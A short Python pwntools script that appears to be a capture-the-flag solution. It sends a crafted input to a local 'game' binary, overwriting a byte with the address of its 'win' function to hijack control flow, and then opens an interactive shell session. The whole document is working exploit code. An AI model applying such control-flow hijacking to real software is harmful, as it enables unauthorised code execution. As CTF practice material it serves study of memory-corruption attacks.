from pwn import *

host = args.HOST or 'localhost'
port = int(args.PORT or 31119)

context.binary = exe = ELF('./bin/game')

def conn():
    if args.LOCAL:
        return process(exe.path)
    else:
        return remote(host, port)

def main():
    r = conn()
    payload = bytearray(b'lXddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddwwwww')
    payload[1] = (exe.sym['win'] + 5) & 0xff
    r.send(payload)
    r.clean(timeout=(0.05 if args.LOCAL else 1))
    r.interactive()

if __name__ == '__main__':
    main()
